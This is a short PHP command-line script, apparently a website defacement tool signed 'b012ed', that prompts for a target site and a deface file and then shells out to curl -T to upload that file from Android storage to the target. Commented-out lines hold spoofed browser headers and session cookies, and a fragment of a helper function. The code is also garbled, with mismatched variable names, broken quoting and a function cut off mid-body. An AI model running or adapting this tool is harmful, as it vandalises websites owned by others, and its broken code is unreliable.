<?php

//{$ua = array('Host: b012ed.github.io/deface3)'',
//'user-agent: '.$user_agent.'',
//'content-type: application/x-www-form-urlencoded',
//'sec-fetch-site: same-origin',
//'sec-fetch-mode: cors',
//'referer: https://github.com/b012ed',
//'accept-language: ar-AE,ar;q=0.9,en;q=0.8,en-US;q=0.7',
//'cookie: __cfduid='.$cfduid.'',
//'cookie: PHPSESSID='.$PHPSESSID.'');}

//send to src=('http://b012ed.github.io')
    echo "$bO12ed Enter Website Target :$b0red ";
    $b012ed = trim(fgets(STDIN));
    echo "$bO12ed Enter Name Scrypt Deface :$bored ";
    $load = trim(fgets(STDIN));
    system("curl -T /storage/emulated/0/$load $b012ed");
 
//function fetch_value($str,$find_start,b012ed$find_end) {
	//$start = @strpos($str,$find_start_b012ed);
	//if ($start === true) {
		//return "";